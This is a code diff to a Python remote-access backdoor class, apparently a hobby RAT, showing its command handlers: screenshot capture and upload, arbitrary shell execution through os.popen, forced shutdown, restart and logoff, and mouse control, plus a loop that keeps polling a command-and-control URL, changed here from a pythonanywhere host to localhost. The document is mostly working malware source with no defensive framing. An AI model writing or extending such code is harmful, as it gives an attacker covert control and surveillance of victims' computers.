@@ -75,7 +75,6 @@ class backdoor:
                     output += file_to_download + " does not exist \n"
 
             elif command.startswith("screenshot"):
-                print("screenshot")
                 myScreenshot = pyautogui.screenshot()
                 myScreenshot.save('screenshot.png')
                 sample_file = open("screenshot.png", "rb")
@@ -113,16 +112,16 @@ class backdoor:
                 power_command_argument = power_command_argument.replace('"', '')
                 power_command_argument = power_command_argument.replace("'", "")
                 if power_command_argument.lower() == "shutdown":
-                    os.system("shutdown /p")
                     output += "Shutting down the pc\n"
+                    os.system("shutdown /p")
                     continue
                 elif power_command_argument.lower() == "restart":
-                    os.system("shutdown /r")
                     output += "Restarting the pc\n"
+                    os.system("shutdown /r")  
                     continue
                 elif power_command_argument.lower() == "sleep":
-                    os.system("shutdown /l")
                     output += "Computer is going on sleep\n"
+                    os.system("shutdown /l")
                     continue
                 output += power_command_argument + " is a invalid argument, (shutdown, restart, sleep)\n"
             elif command.startswith("volume"):
@@ -179,6 +178,7 @@ class backdoor:
                         mouse_command_args = mouse_command_args.replace(")", "")
                         mouse_command_args = mouse_command_args.replace(" ", "")
                         mouse_command_args = mouse_command_args.split(",")
+                        output += "Clicked"
                         if len(mouse_command_args) > 1:
                             mouse_command_args = list(map(int,mouse_command_args))
                             pyautogui.click(mouse_command_args[0], mouse_command_args[1], button="right")
@@ -186,13 +186,14 @@ class backdoor:
                         else:
                             pyautogui.click()
                             continue
-                        output += "Clicked"
+                        
                     elif mouse_command.startswith("click"):
                         mouse_command_args = mouse_command.replace("click", "")
                         mouse_command_args = mouse_command_args.replace("(", "")
                         mouse_command_args = mouse_command_args.replace(")", "")
                         mouse_command_args = mouse_command_args.replace(" ", "")
                         mouse_command_args = mouse_command_args.split(",")
+                        output += "Clicked"
                         if len(mouse_command_args) > 1:
                             mouse_command_args = list(map(int,mouse_command_args))
                             pyautogui.click(mouse_command_args[0], mouse_command_args[1])
@@ -200,7 +201,7 @@ class backdoor:
                         else:
                             pyautogui.click()
                             continue
-                        output += "Clicked"
+                        
                     elif mouse_command.startswith("move"):
                         mouse_command_args = mouse_command.replace("move", "")
                         mouse_command_args = mouse_command_args.replace("(", "")
@@ -233,7 +234,9 @@ class backdoor:
                     else:
                         output += "Invalid command [click(),right_click(), move(), spam_click()\n"
             else:
+                output += " \n"
                 output += os.popen(command).read() + "\n"
+                
                 
 
         return output
@@ -241,7 +244,7 @@ class backdoor:
 
 while True:
     try:
-        backdoor("https://pybdtest.pythonanywhere.com/") 
+        backdoor("http://127.0.0.1:8000/") 
     except:
         pass
     try: 
